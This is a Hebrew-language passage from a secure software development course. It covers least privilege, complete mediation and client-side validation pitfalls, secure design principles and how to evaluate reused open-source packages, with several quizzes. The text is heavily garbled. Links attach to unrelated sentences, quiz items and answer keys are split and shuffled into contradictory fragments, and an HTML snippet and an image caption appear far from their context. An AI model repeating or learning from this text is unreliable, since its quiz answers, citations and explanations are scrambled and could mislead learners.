 אם הוא מתערער על ידי תוקף (אם כי לעתים קרובות זה לא מעשי).[למרבה הצער, מקובל לנהל הרשאות בצורה לא נכונה. לדוגמה, ישנם מקרים רבים שבהם תוכניות לא הצליחו לשחרר הרשאות בכל המקרים (למשל, משום שהעלאת חריג דילגה על הקוד שהשמיט הרשאות, או משום שהקוד שהיה אמור לשחרר הרשאות אינו פועל בכל המקרים).](https://cwe.mitre.org/)🔔 ניהול הרשאות לא תקין הוא גורם כה נפוץ לפגיעויות אבטחה, עד כי הוא 2021 CWE Top 25 #29 ו- 2019 CWE Top 25 #24. זה *CWE-269* (*ניהול הרשאות לא תקין*).

חידון 2.3: הפריבילגיה הקטנה ביותר

1.  [**>>בכיוון אחד אתה **](https://owasp.org/www-project-top-ten/)<br>אולי* להיות מסוגל ליישם חלק מהפריבילגיה "הפחותה ביותר" (בהתאם לתוכנית) היא להשתמש בהצהרות SQL GRANT כך שלתוכנית אין את הזכויות לשנות נתונים מסוימים גם אם תוקף משתלט על תוכנית זו. אמת או שקר? <<*(!) לא נכון.

2.  [**(x) נכון.**](https://cwe.mitre.org/top25/archive/2019/2019\_cwe_top25.html)<br>גישור מלא (אי עקיפה)

בכל פעם שתוכנית מקבלת בקשה, לפחות ממקור שהתוכנית אינה יכולה לתת בו אמון מלא (הוא נמצא מחוץ לגבולות האמון), התוכנית חייבת לבדוק את הבקשה. דוגמאות לבדיקות אבטחה הן בדיקה שהבקשה מאושרת ושהקלט תקף לפני שאתה פועל על סמך נתונים אלה. עיקרון זה נקרא גם 

*   [אי-עקיפה](https://owasp.org/www-project-mobile-top-10/)כי הנקודה היא שאסור לתוקף לעקוף בדיקות ביטחוניות.,

*   [טעות נפוצה היא לנסות להפעיל בדיקות אבטחה במערכת שהתוקף יכול לשלוט בה. אם תוקף יכול לשלוט במערכת, התוקף יכול לעקוף בקלות את כל בדיקות האבטחה המופעלות על-ידי אותה מערכת. בואו נסתכל על כמה דוגמאות של ](https://wiki.owasp.org/index.php/OWASP_Internet_of_Things_Project)ביטחון

 עיצובים.

עיצוב לא מאובטח: אימות קלט HTML בצד הלקוח

דוגמה פשוטה לעיצוב לא מאובטח היא כאשר יישום אינטרנט בצד השרת שולח HTML מסוים ללקוח, ו- HTML כולל דרישת אימות מסוימת. לדוגמה, HTML עשוי לכלול את המשפט הבא כדי לדרוש שהאורך המרבי לא יעלה על 100:*HTML זה בסדר אם מטרתו היא להיות בדיקה מהירה כדי להתמודד עם טעויות מקריות. אבל מכיוון שהתוקפים יכולים לשלוט בדפדפן האינטרנט שלהם, בדיקת אורך מקסימלית זו היא טריוויאלית לעקוף. תוקף יכול לשלוח בקלות קלט ארוך בהרבה. אתה לא יכול *לסמוך[ בדפדפן האינטרנט כדי לבצע עבורך כל בדיקה רלוונטית לאבטחה אם התוקף יכול לשלוט בדפדפן האינטרנט או להחליף אותו.](https://csrc.nist.gov/csrc/media/publications/conference-paper/1998/10/08/proceedings-of-the-21st-nissc-1998/documents/early-cs-papers/ande72a.pdf)עיצוב לא מאובטח: אימות קלט JavaScript/WASM בצד הלקוח[עיצוב לא מאובטח קשור ונפוץ הוא המקום שבו קוד נשלח לדפדפני אינטרנט, לדוגמה, כ- JavaScript או WebAssembly (WASM), וקוד זה מבצע בדיקות אבטחה לפני שליחת הנתונים שלו לשרת. ברוב המצבים, תוקף יכול לשלוט בדפדפן האינטרנט, בזמן שהשרת נמצא בשליטתך, כך ששוב, אינך יכול לסמוך על שום דבר שדפדפן האינטרנט עושה. במילים אחרות, כל בדיקות אבטחה בקוד שנשלח לדפדפן יכולות לעקוף באופן טריוויאלי על ידי תוקף, שכן התוקפים שולטים בדפדפני האינטרנט שלהם. בעיה קשורה היא מתן גישה ישירה למסד נתונים למשתמשים לא מהימנים. לעתים קרובות משתמשים אינם זקוקים לגישה מלאה, ולכן זה נותן למשתמשים הרבה יותר הרשאות ממה שהם צריכים (תוך הפרת הפריבילגיה הפחותה), וגישה כזו יכולה להקשות על מניעת עקיפת בדיקות אבטחה. האיור הבא מציג טעות זו:](https://apps.dtic.mil/dtic/tr/fulltext/u2/772806.pdf)יישום JavaScript לא מאובטח*עיצוב מאובטח: אימות קלט בסביבה שניתן לסמוך עליה*אתה יכול להשתמש JavaScript בצורה מאובטחת, אתה רק צריך לעשות את זה נכון. אתה יכול לשלוח JavaScript ללקוח, ואתה יכול לעשות כמה בדיקות רלוונטיות לאבטחה בדפדפן (למשל, כדי לתת משוב מהיר). אבל אם התוקפים יכולים לשלוט בדפדפני אינטרנט מסוימים (אך לא בשרתים), בדיקות האבטחה בצד הדפדפן אינן רלוונטיות לאבטחה. במקרה נפוץ זה, עליך לבצע את כל בדיקות הקלט הקשורות לאבטחה בשרתים, גם אם חלק מהבדיקות היו אמורות להיעשות בלקוח וכעת הן "מבוצעות מחדש". בדיקות הקלט (אימותים) לא באמת מתבצעות מחדש, מכיוון שלא ניתן היה לסמוך על אלה בצד הלקוח.

האיור הבא מציג עיצוב דומה אך מאובטח; שים לב שכל הבדיקות הקשורות לאבטחה נעשות בשרת, שכן במקרה זה זו המערכת שאנו יכולים לסמוך עליה. היא גם מונעת גישה ישירה למסד נתונים, וזה לעתים קרובות רעיון טוב אם משתמשים אינם זקוקים לגישה ישירה:

#### חלופה מאובטחת יותר של יישום JavaScript

עיצוב לא מאובטח: יישום נייד עם בדיקה בצד הלקוח

עיצוב לא מאובטח נפוץ דומה הוא קוד באפליקציות סלולריות לסמארטפון שעושה את כל בדיקות האבטחה לפני שליחת הנתונים שלו לשרת. שוב, איננו יכולים להניח כי בדיקות אבטחה כלשהן ביישום הנייד אכן יבוצעו. תוקף יכול לשנות את היישום הנייד, או לכתוב יישום אחר, כדי לעקוף את כל הבדיקות שבוצעו ביישום הנייד. אם אתה כותב יישום נייד לסמארטפון, אתה גם בדרך כלל לא יכול לסמוך על היישומים האחרים - היישומים האחרים עשויים בעצמם להיות זדוניים!***עיצוב לא מאובטח: יישום לקוח בהתאם לשרת לא מהימן***אל תתבלבלו; ההודעה אינה 

"שרת טוב, לקוח רע"*. הבעיה היא שכמעט בכל המקרים, כל קוד שאתה צריך לסמוך עליו חייב לפעול בסביבה שאתה יכול לסמוך עליה.*אם אתה כותב דפדפן אינטרנט, לדוגמה, תצטרך לסמוך על שירותי מערכת ההפעלה המקומיים, אך אתה בהחלט לא יכול לסמוך על שרתי אינטרנט מרוחקים שרירותיים - חלק מאותם שרתי אינטרנט מרוחקים עלולים לשלוח לך נתונים זדוניים!

המפתח: הפעל קוד שעליך לתת בו אמון בסביבה שניתן לסמוך עליה*בקיצור: כל קוד שאתה צריך לסמוך עליו חייב (ברוב המקרים) לרוץ בסביבה שאתה יכול לסמוך עליה, *לא* במערכת שעשויה להיות נשלטת על-ידי תוקף.*באפשרותך להשתמש ב- JavaScript בצד הלקוח, ב- WebAssembly בצד הלקוח וביישומים ניידים - זו לא הבעיה. אתה יכול לכתוב גם דפדפני אינטרנט! הבעיה היא מתן אמון במערכת שעשויה להיות תחת שליטתו של תוקף. אם יש לך מערכת שרת-לקוח מבוססת אינטרנט, לדוגמה, בדרך כלל הקוד הפועל בשרת (שאתה שולט בו) חייב לבצע את כל בדיקות האבטחה. אחרי הכל, תוקפים יכולים לבנות או לשנות לקוחות אינטרנט משלהם, כולל כל JavaScript שנשלח ללקוח שלהם על ידי שרת. זה בסדר להריץ בדיקות על מערכת שאתה לא סומך עליה באופן מלא אם אתה רוצה לספק תגובה מהירה לטעויות לא מכוונות. אבל זה לא מספיק - עבור אבטחה, כל בדיקות האבטחה צריך להיעשות (או מחדש) על מערכת שאתה יכול לסמוך באופן מלא. באפשרותך להפעיל בדיקות אלה בצד השרת באמצעות JavaScript, WebAssembly או כל דבר אחר שאתה בוטח בו - אך עליך להפעיל את הבדיקות במערכת שניתן לסמוך עליה.*מפתחים מסוימים מנסים להריץ קוד במערכות שהם לא יכולים לסמוך עליהן באמצעות ערפול. כלומר, הם ישתמשו בכלים שמנסים להקשות על הבנת הקוד שנשלח למערכת שהם לא יכולים לסמוך עליה. דוגמה לכך היא שימוש במיניפיקציה של JavaScript ובתקווה שזה יקשה על הבנת קוד הלקוח. אל תעשה את זה! המטרה של מיניפיקציה של JavaScript היא להפחית את מספר הבתים שנשלחים ברשת, לא להסתיר את מה שהקוד עושה או למנוע את שינויו.*מה שניתן לטשטש ניתן לטשטש, וקל להפליא לתוקפים לטשטש מידע. קיימים כלים רבים שיכולים לטשטש מידע במהירות. עדיף להימנע מניסיון להריץ קוד שאתה צריך לסמוך עליו במערכות שאינך יכול לסמוך עליהן.

#### זה הרבה יותר טוב להפעיל תוכנה שאתה צריך לסמוך על מערכת שאתה יכול לסמוך עליה; אז התוכנה פשוט עובדת כל הזמן.

סימני אזהרה

בניית מערכת עם בדיקות ביטחוניות שניתן לעקוף היא טעות מסוכנת. לא רק שזה אומר שהמערכת אינה מאובטחת, אלא שלעתים קרובות קשה מאוד לתקן את הטעות הזו ברגע שאתה עושה אותה. ייתכן שיהיה עליך לשכתב תוכנות רבות כדי לתקן טעות זו. הנה רשימה מהירה של דברים שיש לחפש שעשויים להצביע על טעויות מסוג זה:

HTML או תבנית נתונים אחרת הנשלחת ללקוח המבצע אימות קלט רלוונטי לאבטחה במערכת שתוקף עשוי לשלוט בה. זה יכול להיות בסדר, אבל רק אם כל הבדיקות האלה מבוצעות מחדש בסביבה מהימנה.

JavaScript או קוד אחר שנשלח ללקוח שמבצע אימות קלט או פעולות רלוונטיות אחרות לאבטחה במערכת שהתוקף עשוי לשלוט בה. זה יכול להיות בסדר, אבל רק אם כל הבדיקות האלה מבוצעות מחדש בסביבה מהימנה.

# אפליקציה למכשירים ניידים שמבצעת אימות קלט רלוונטי לאבטחה. זוהי אותה בעיה בצד הלקוח.

מסד נתונים הנגיש ישירות דרך הרשת לשימוש על ידי יישום לקוח (דפדפן אינטרנט, אפליקציה לנייד וכו '). פעולה זו יכולה להיות מאובטחת, אך עליך לוודא שכל הפעולות שהמשתמש רשאי לבצע מורשות. במערכות רבות, אתה יכול לשלוט על זה עם הפקודה SQL GRANT, אם אתה צריך לעשות את זה. עם זאת, לעתים קרובות עדיף (או הכרחי) לתווך גישה באמצעות תוכנית במקום לספק גישה ישירה למסד נתונים. גישה ישירה למסד נתונים עלולה להקשות על ביצוע אימות קלט. לעתים קרובות זה מפר את הפריבילגיה לפחות, שכן לעתים קרובות המשתמש אינו זקוק לגישה מלאה למסד הנתונים. אם אתה מספק גישה ישירה למסד נתונים, שקול להגביל את ההרשאות. לדוגמה, ייתכן שתעניק גישה רק לתצוגה לקריאה בלבד במקום למסד הנתונים כולו.

ערוץ תקשורת רשת שתוקף יכול לחטוף. חיבורי רשת המיושמים כראוי המשתמשים ב- TLS (כגון 

1.  https:

2.  ) ו-SSH מתנגדים לחטיפה; כמעט כל השאר לא. תוכנה עשויה לתקשר דרך הערוץ בהנחה שהיא מדברת עם אותו משתמש/תוכנה, אך ניתן לעקוף זאת בקלות אם ניתן לחטוף את הערוץ.

3.  ניסיון להפעיל תוכנה שאתה חייב לסמוך עליה בסביבות לא אמינות

4.  יכול

5.   אתה מנסה להפעיל תוכנה שאתה צריך לסמוך עליה במערכת שאתה לא סומך עליה? אתה יכול לנסות, אבל זה בדרך כלל מסתדר רע, וניסיון לעשות את זה הוא נושא מתקדם מאוד. הנה כמה מהטכניקות שנוסו:

## טכניקה אחת היא הצפנה הומומורפית. זה מאפשר לך להפעיל קוד בזמן שהנתונים נשארים מוצפנים. אבל כיום הצפנה הומומורפית היא מעשית רק בנסיבות מיוחדות. זה סדרי גודל איטיים ומורכבים הרבה יותר.

### מנגנוני ה-Software Guard eXtensions (SGX) של אינטל אמורים לאפשר ביצוע ואחסון נתונים, אך בפועל הם נשברו שוב ושוב (

ביזה של מפתחות קריפטו מ-SGX מאובטח במיוחד שולחת את אינטל לטרוף שוב*מאת דן גודין, 2020).,*אם אתה מנסה לאבטח משחקים במחשב נייד / שולחני, ואתה לא סומך על המחשב הנייד / שולחן העבודה, יש מערכות נגד לרמות. אבל מערכות נגד רמאות נשברות באופן שגרתי. עדיף לך לקיים אירועים פיזיים שבהם כל המחשבים הניידים / המחשבים השולחניים נמצאים בבעלותך.*באופן כללי, עדיף לך עם פתרונות פשוטים שאינם כרוכים בניסיון לסמוך על מערכות הנשלטות על ידי תוקפים.*חידון 2.4: גישור מלא (אי עקיפה)

\>>שרת שולח JavaScript מבוסס React לדפדפן אינטרנט. מפתח רוצה לכלול כמה בדיקות אבטחה של הקלט בקוד React בצד הלקוח (בצד הדפדפן), ואומר שהשרת יכול לתת אמון בבדיקות אבטחה אלה מכיוון שהשרת שלח את קוד React בצד הלקוח מלכתחילה. איזה מהדברים הבאים נכון? <<

( ) השרת *יכול* סמוך על בדיקות האבטחה בצד הלקוח במקרה זה.

(x) השרת 

לא* סמוך על בדיקות האבטחה בצד הלקוח במקרה זה*\[הסבר]

*   לשרת אין אפשרות לבדוק בדיקות אבטחה בצד הלקוח באופן כללי, כולל במקרה זה. השרת עשוי לשלוח JavaScript מבוסס React לדפדפן אינטרנט, אך 

*   התוקף

####  שולט בדפדפן האינטרנט. משמעות הדבר היא שהתוקף יכול לשנות את הקוד המופעל לאחר קבלתו, או פשוט לשנות את התשובות שהקוד ישלח בחזרה לשרת. שים לב שזה לא ספציפי ל- React, זה יהיה נכון עבור 

כלשהו

 קוד בצד הלקוח... אנחנו פשוט משתמשים ב-React כדוגמה נפוצה.  מערכת בדרך כלל אינה יכולה לתת אמון במערכת אחרת הנמצאת תחת שליטה פוטנציאלית של תוקף.

\[הסבר]

שאר עקרונות העיצוב של זלצר ושרודר

הבה נבחן בקצרה את שאר עקרונות העיצוב המאובטח שזוהו על ידי זלצר ושרודר (מעבר לפריבילגיה הפחותה והגישור המלא):*כלכלת מנגנון (המכונה פשטות)*. המערכת, בפרט החלק שהאבטחה תלויה בו, צריכה להיות פשוטה וקטנה ככל האפשר. זה הופך את החלק הזה של המערכת לקל יותר לבדיקה וקשה יותר לטעות. כמובן, תוכנה מודרנית מתבקשת לעתים קרובות לספק הרבה פונקציונליות, אז אתה בדרך כלל לא יכול לעשות הכל פשוט מאוד, אבל אתה יכול לפחות לעבוד כדי להפוך את החלק כי האבטחה תלויה פשוט ככל האפשר.

עיצוב פתוח

### . אסור שמנגנון ההגנה יהיה תלוי בבורות של התוקפים. במקום זאת, המנגנון צריך להיות ציבורי, בהתאם לסודיות של פריטים מעטים יחסית (וניתנים לשינוי בקלות) כמו סיסמאות או מפתחות פרטיים. עיצוב פתוח מאפשר ביקורת ציבורית נרחבת. עיצוב פתוח גם מאפשר למשתמשים לשכנע את עצמם שהמערכת שעומדת לשימוש מספקת. למען האמת, זה לא מציאותי לנסות לשמור על סודיות עבור מערכת כי הוא מופץ באופן נרחב; מפרקים וחומרה חתרנית יכולים לחשוף במהירות כל "סודות" ביישום. אחד היתרונות הגדולים של תוכנת קוד פתוח (OSS) הוא שהיא מיישמת טוב יותר את עקרון העיצוב הפתוח; לקוד המקור של OSS יש עיצוב פתוח, המאפשר לכל אחד אחר לסקור אותו ולבצע שינויים כדי לשפר אותו. כמובן, OSS צריך 

בעצם[* להיבדק כדי שזה יעזור, אבל זה חשוב *](http://web.mit.edu/Saltzer/www/publications/protection/index.html)פוטנציאלי

 יתרון.*ברירות מחדל בטוחות לכשל (aka ברירות מחדל מאובטחות כשל)*. התקנת ברירת המחדל צריכה להיות ההתקנה המאובטחת. אם לא בטוח שצריך לאפשר משהו, אל תאפשר את זה. לדוגמה, אל תפיץ תוכנה עם סיסמה ריקה או סיסמת ברירת מחדל; במקום 

1.  **Least privilege**<br>>>איזה מהבאים הוא עיקרון אבטחה נוסף שימושי?|| בדוק את כל האפשרויות שלהלן שהן עקרונות אבטחה מקובלים, ואל תבדוק אותן אחרת. <<

2.  **\[!x] תכנן ויישם מערכות כדי להבטיח שלאחר אישור הבקשה, תוקף אינו יכול לשנות משהו רלוונטי להחלטה זו לפני שהבקשה מטופלת. {{ לא נבחר: זה חשוב, זה נקרא מצב מרוץ זמן בדיקה/זמן שימוש (TOCTOU). }}**<br>\[x] שנה את העיצוב והתצורה של המערכת כך שהסבירות לפשרה תהיה נמוכה יותר 

3.  **אפילו**<br> אם יש פגם. {{ לא נבחר: זה נכון, זה נקרא "הקשחת" מערכת. }}

4.  **\[ ] הצב סיסמאות ומפתחות סודיים בקוד המקור, כך שהמערכת תוכל לקבל מידע זה במהירות ולהשתמש בו מבלי להיות תלויה ברכיבים חיצוניים או במאגרי נתונים. {{ נבחר: לא, אנא עשה זאת **<br>לא

5.  ** לעשות את זה. סיסמאות ומפתחות סודיים לא צריכים להיות בקוד מקור. אם הם לא מופיעים בקוד המקור, אנשים שיכולים לראות את קוד המקור לא יקבלו את המידע הסודי, והרחקתם מקוד המקור גם מקלה על שינוי הסיסמאות והמפתחות. }}**<br>\[ ] כלול שליטה (כולל תוכניות) עם נתונים, כך כיצד לתפעל את הנתונים מסופק בקלות עם הקוד. {{ נבחר: זה יכול להיות שימושי, אבל זה גם מסוכן מבחינה ביטחונית. אם תוקף מצליח להחדיר מידע "נוסף" לנתונים, עיצוב זה יכול להקל על הפעלת תוכנית שעלולה להיות זדונית. לפעמים חשוב לעשות זאת בכל מקרה, אבל זה יוצר סיבוכים נוספים בעת פיתוח תוכנה מאובטחת. }}

6.  **שימוש חוזר בתוכנות חיצוניות**<br>פרק זה מתאר כיצד לעשות שימוש חוזר בתוכנה מתוך מחשבה על אבטחה, כולל בחירה, הורדה, התקנה ועדכון של תוכנות כאלה.

7.  **מטרות הלמידה:**<br>דונו בהשפעה החיונית שיש לתוכנות חיצוניות על האבטחה.

8.  **דונו כיצד להתחשב באבטחה בעת בחירת תוכנה.**<br>דונו כיצד להתחשב באבטחה בעת הורדה והתקנה של תוכנה.

דונו בחשיבות של עדכון תוכנה שנעשה בה שימוש חוזר.

דונו בחשיבות של הימנעות/החלפה של שימוש בממשקים מיושנים.*שרשרת אספקה*יסודות השימוש החוזר בתוכנה*בעת פיתוח תוכנה, אתה בדרך כלל עושה שימוש חוזר בהרבה תוכנות אחרות. זה עשוי לכלול מערכת הפעלה, זמן ריצה של גורם מכיל, מסגרות, ספריות, הרחבות, יישומי Plug-in, ערכות נושא וכן הלאה. בדרך כלל תשתמש גם בכלי פיתוח שאחרים פיתחו. תוכנה זו שנעשה בה שימוש חוזר, והאופן שבו אתה מקבל אותה, יכולים להשפיע באופן משמעותי על אבטחת התוצאה.*תלות

 (אוחזר מתוך *xkcd.com*רשיון תחת, 

#### CC-BY-NC-2.5

)

יש הרואים בבחירת התוכנה שנעשה בה שימוש חוזר כחלק מהעיצוב, שכן היא משפיעה בבירור על האופן שבו אנו מחלקים את הבעיה. אחרים עשויים לתאר זאת כקטגוריה משלה, למשל, שרשרת אספקה. לא משנה איך תקראו לזה, זה חשוב. באופן כללי, מערכות תוכנה כיום הן בעיקר תוכנות בשימוש חוזר ממקום אחר.

אם אתם רוכשים תוכנה יקרה שבחרתם מטעם ארגון, לעיתים קרובות ישנם שלבים ותהליכים רבים שיש לעבוד עליהם, המתמקדים בעיקר בשליטה בכסף. זה מחוץ לתחום של הקורס הזה. במקום זאת, אנחנו הולכים להתמקד בהיבטים הספציפיים הקשורים לביטחון.

מערכות רבות תומכות בהתקנת הרחבות שפותחו ומתוחזקות בנפרד מתוכנית "הליבה" (לעתים קרובות על ידי מפתחים שונים). 

יש להעריך הרחבות בנפרד לפני התקנתן

. מערכת הליבה עשויה להיות מאובטחת יחסית, אבל זה לא אומר שכל ההרחבות שלה מאובטחות, ולעתים קרובות הסיכונים הגדולים ביותר הם מההרחבות. הרחבות אלה עשויות להיקרא בשמות רבים, כולל הרחבות, יישומי Plug-in, הרחבות, ערכות נושא, רכיבים או חבילות. לא משנה איך קוראים להם, העריכו גם אותם. לדוגמה, PatchStack דיווחה כי בעוד שוורדפרס הפעילה 43.2% מהאתרים באינטרנט בשנת 2021, "נקודות תורפה מתוספים וערכות עיצוב נשארות כאחד האיומים הגדולים ביותר על אתרים הבנויים על וורדפרס". הם ציינו כי רק 0.58% מפגיעויות האבטחה מקורן בליבת וורדפרס בשנת 2021; שאר הפגיעויות היו ברכיבים (תוספים וערכות נושא). מה שגרוע יותר, 29% מהתוספים של וורדפרס עם נקודות תורפה קריטיות לא קיבלו שום תיקון. זה לא היה משנה כל כך אם מעט אתרים היו משתמשים ברכיבים, אבל בממוצע באתר וורדפרס מותקנים 18 רכיבים שונים (תוספים וערכות נושא). ראה 

### מצב אבטחת וורדפרס ב-2021

 על ידי PatchStack לקבלת מידע נוסף.

אנחנו משתמשים כאן במונח "תוכנה בשימוש חוזר", כי זה החשש שלנו. תוכנה זו שנעשה בה שימוש חוזר כוללת את כל התוכנות שאתה תלוי בהן כאשר התוכנה פועלת, המכונה גם יחסי התלות שלה.

#### הרוב המכריע של התוכנות שבהן אתה משתמש שוב יהיו בדרך כלל תוכנות קוד פתוח (OSS). אז בואו נתמקד בטיפים כיצד להעריך את OSS לפני השימוש החוזר בו. חלק מהטיפים הללו יחולו גם על תוכנות קוד סגור.

בחירה (הערכה) של תוכנות קוד פתוח

1.  **ישנם דברים חשובים רבים שיש לקחת בחשבון בעת בחירת תוכנת קוד פתוח.**<br>קרן אבטחת הקוד הפתוח (OpenSSF) פיתחה **מדריך תמציתי להערכת תוכנות קוד פתוח** שיכולים לעזור. הם מציעים כי, "כמפתח תוכנה, לפני השימוש בתלות או בכלים של תוכנת קוד פתוח (OSS), זהה מועמדים והערך את המובילים מול הצרכים שלך. כדי להעריך תלות פוטנציאלית של OSS באבטחה ובקיימות, שקול את השאלות הבאות..."**גירסת 2022-09-01 מציעה את השאלות הבאות, יחד עם כיצד לקבל מידע שיעזור לענות עליהן:**האם אתה יכול להימנע מלהוסיף אותו?** האם אתה יכול להשתמש בתלות קיימת (אולי עקיפה) במקום זאת? כל תלות חדשה מגדילה את שטח התקיפה (חתרנות של התלות החדשה, או התלות הטרנזיטיבית שלה, עלולה לערער את המערכת).**האם אתה מעריך את הגרסה המיועדת?

2.  ** ודא שאתה מעריך את הגרסה המיועדת של התוכנה, לא מזלג אישי ולא מזלג בשליטת תוקף. טכניקות אלה מסייעות להתמודד עם התקפת "שגיאת הקלדה" הנפוצה (שבה תוקף יוצר שם "כמעט נכון").**<br>בדוק את שמו ואת אתר האינטרנט של הפרויקט עבור הקישור.

3.  **אמת את קשר המזלג ב- GitHub / GitLab.**<br>בדוק אם הפרויקט מזוהה עם קרן (במקרה זה, אתה אמור להיות מסוגל לגשת למקור הרשמי מאתר האינטרנט של הקרן).

4.  **בדוק את זמן היצירה שלה, ולבדוק את הפופולריות שלה.**<br>האם זה מתוחזק?

5.  ** תוכנה לא מתוחזקת היא סיכון; רוב התוכנות זקוקות לתחזוקה שוטפת. אם היא לא מאובטחת, סביר להניח שהיא גם לא בטוחה.**<br>האם התרחשה פעילות משמעותית לאחרונה (למשל, התחייבויות) בשנה האחרונה?*מתי היה האלבום האחרון שלו (האם זה היה לפני פחות משנה)?*האם יש יותר ממתחזק אחד, באופן אידיאלי מארגונים שונים?***האם יש מהדורות אחרונות או הכרזות מהמתחזק(ים) שלה?***האם מחרוזת הגרסה שלו מצביעה על חוסר יציבות (למשל, להתחיל ב-"0", לכלול "אלפא" או "בטא" וכו')*האם יש ראיות לכך שהמפתחים שלה פועלים כדי להפוך אותה למאובטחת?*קבע אם הפרוייקט הרוויח (או נמצא בדרך לכך) 

6.  **תג 'שיטות עבודה מומלצות של קרן אבטחת קוד פתוח (OpenSSF)**<br>.*בדיקת מידע ב- *https://deps.dev

7.  **כולל שלה, **<br>כרטיסי ניקוד של OpenSSF* וכל נקודות התורפה הידועות.*קבע אם יחסי התלות של החבילה מעודכנים (באופן יחסי).*קבע אם יש תיעוד המסביר מדוע הוא מאובטח (המכונה "מקרה ביטחון").*האם יש בדיקות אוטומטיות הכלולות בצנרת CI שלה? מהו כיסוי הבדיקה שלה?

8.  **האם הפרויקט מתקן באגים (במיוחד באגים באבטחה) בזמן? האם הם משחררים תיקוני אבטחה עבור מהדורות ישנות יותר? האם יש להם גרסת LTS (תמיכה בזמן ארוך)?**<br>האם המפתחים משתמשים בתכונות אבטחה של אירוח קוד היכן שרלוונטי (למשל, אם הם נמצאים ב-GitHub או ב-GitLab, האם הם משתמשים בהגנה על סניפים)?

9.  **זהה ביקורות אבטחה ואם נמצאו בעיות כלשהן. ביקורות אבטחה הן נדירות יחסית, אך ראה OpenSSF של "**<br>סקירות אבטחה

<br>

".[שימוש ](https://cwe.mitre.org/data/definitions/732.html)המדריך של SAFECode *עקרונות להערכת אבטחת תוכנה* (2019), גישה רב שכבתית לבחינת אבטחת התוכנה.*איך הם נוסעים לפי *אופן צ'יין[ מדריך עזר להבטחת אבטחה ( ](https://cwe.mitre.org/data/definitions/276.html)מדריך אוגוסט 2021* ו *טיוטה עדכנית יותר

####  זמינים)?

האם הם מיישמים פרקטיקות רבות ב 

מדריך תמציתי לפיתוח תוכנה מאובטחת יותר**?**האם קל להשתמש בו בצורה מאובטחת?**האם תצורת ברירת המחדל ו"הדוגמאות הפשוטות" מאובטחות (למשל, הצפנה מופעלת כברירת מחדל בפרוטוקולי רשת)? אם לא, הימנע מכך.**האם הממשק/API שלו מתוכנן להיות קל לשימוש בצורה מאובטחת (למשל, אם הממשק מיישם שפה, האם הוא תומך בשאילתות עם פרמטרים)?**האם יש הדרכה כיצד להשתמש בו בצורה מאובטחת?**האם יש הוראות כיצד לדווח על פגיעויות?** ראה את **מדריך ליישום תהליך מתואם של גילוי פגיעויות עבור פרוייקטי קוד פתוח

 לקבלת הדרכה לפרויקטים של OSS.,**האם יש לו שימוש משמעותי?** תוכנה עם משתמשים רבים או משתמשים גדולים עשויה להיות בלתי הולמת לשימושך. עם זאת, סביר יותר שתוכנה הנמצאת בשימוש נרחב תציע מידע שימושי על אופן השימוש המאובטח בה, ויותר אנשים ידאגו לאבטחה שלה. בדוק אם שם דומה הוא פופולרי יותר - זה יכול להצביע על התקפת הקלדה.**מהו רישיון התוכנה?** רישיונות הם מבחינה טכנית לא אבטחה, אבל לרישיונות יכולה להיות השפעה משמעותית על אבטחה וקיימות. ודא שלכל רכיב יש רישיון, שהוא נמצא בשימוש נרחב **רישיון OSI** אם זה OSS, ושזה עולה בקנה אחד עם השימוש המיועד שלך. פרויקטים שלא יספקו פרטי רישיון ברורים נוטים פחות לפעול לפי שיטות עבודה טובות אחרות שמובילות לתוכנה מאובטחת.

מהי ההערכה שלך לגבי הקוד שלה?* אפילו סקירה קצרה של קוד המקור של התוכנה, והשינויים שלה לאורך זמן, יכולה לתת לך כמה תובנות. להלן דברים שיש לקחת בחשבון:*כאשר אתה בודק את קוד המקור שלו, האם יש ראיות בקוד לכך שהמפתחים ניסו לפתח תוכנה מאובטחת (כגון אימות קלט קפדני של קלט לא מהימן ושימוש בהצהרות פרמטריות)?*האם יש עדויות לתוכנה לא מאובטחת/ לא שלמה (למשל, הצהרות TODO רבות)?*מהן הבעיות "המובילות" המדווחות על-ידי כלי ניתוח סטטיים?

האם יש ראיות לכך שהתוכנה זדונית? לכל 

אוסף הסכינים של Backstabber[בדוק את סקריפטי ההתקנה / שגרות זדוניות, בדוק אם יש סינון נתונים מ, ](https://cwe.mitre.org/data/definitions/269.html)~/.ssh* ומשתני סביבה, ולחפש ערכים מקודדים/ מעורפלים המבוצעים. בדוק את פעולות ה-Commit האחרונות לאיתור קוד חשוד (ייתכן שתוקף הוסיף אותן לאחרונה).*שקול להפעיל את התוכנה בארגז חול כדי לנסות להפעיל ולזהות קוד זדוני.

#### שקול להפעיל את כל מקרי הבדיקה המוגדרים כדי להבטיח שהתוכנה תעבור אותם.

משאבים אחרים שייתכן שתרצה לשקול כוללים:*מדריך Tidelift לבחירת חבילות היטב (פברואר 2021)*גאות ושפל,

כיצד להעריך תוכנות קוד פתוח / תוכנה חופשית (OSS / FS) תוכניות

ישנם מקומות רבים בהם ניתן למצוא חלק מהמידע הזה (מעבר לשימוש פשוט במנוע חיפוש). הם כוללים את דף הבית של הפרויקטים ו/או מאגר קוד המקור, את הדף הראשי של מאגר חבילות ברירת המחדל של המערכת האקולוגית, 

### deps.dev

, *metrics.openssf.org*, 

libraries.io*סינופסיס ברווז שחור, *אופן-האב

#### וקרן לינוקס, 

LFX

```html
    <input id="name" type="text" maxlength="100">
```

.*רוב השאלות הללו חלות גם על תוכנות קוד סגור שנעשה בהן שימוש חוזר.*רוב התוכנות תלויות בתוכנות אחרות, אשר בתורן תלויות לעתים קרובות בתוכנות אחרות עם שכבות רבות. שטר חומרים של תוכנה (SBOM) הוא מלאי מקונן המזהה את רכיבי התוכנה המרכיבים פיסת תוכנה גדולה יותר. למערכות אקולוגיות רבות יש פורמטים ספציפיים למערכת האקולוגית של SBOM. ישנם גם כמה פורמטים של SBOM התומכים במערכות אקולוגיות שרירותיות: 

#### חבילת תוכנה חילופי נתונים (SPDX)

, 

![Insecure design: In this figure security-relevant input validation checks are run in a web browser, and not run again by the web server. Since the attacker can control their own web browser, this is insecure. The database is also directly accessible by logged-in users; this is a bad sign, because this grants a lot of data access that is often unnecessary.](insecure_design.png)

מזהה תוכנה (SWID)

#### ו 

ציקלוןDX

. כאשר SBOM זמין עבור רכיב שאתה חושב להשתמש בו, לעתים קרובות קל יותר להשתמש בנתונים אלה כדי לעזור לענות על כמה מהשאלות המפורטות לעיל. זה גם טוב לספק SBOM למשתמשים פוטנציאליים של התוכנה שלך, מאותן סיבות.

